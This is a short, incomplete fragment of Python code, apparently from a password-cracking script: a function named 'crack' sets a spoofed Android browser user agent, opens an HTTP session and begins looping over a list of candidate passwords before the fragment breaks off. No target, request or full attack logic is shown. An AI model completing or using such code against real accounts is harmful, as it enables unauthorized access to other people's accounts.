...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = "Mozilla/5.0 (Linux; Android 10; Infinix X657C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36" #Infinix
	ses = requests.Session()
	for pw in pwv:
		try:
